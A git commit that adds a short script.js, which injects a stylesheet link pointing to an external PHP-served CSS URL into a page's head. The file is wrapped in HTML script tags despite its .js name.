41cd7bad52491212bdfde8644c9f205bc7fa160b
Vineet Tiwari <166735997+vineettiwari1708@users.noreply.github.com>
2025-08-25 15:11:25 +0530

    Create script.js

---
+++ script.js
@@ -0,0 +1,8 @@
+<script type="text/javascript">
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = 'https://lightcyan-oryx-911920.hostingersite.com/quintedriving.ca.php/?key=45869'; // Your URL
+
+    document.head.appendChild(link);
+</script>
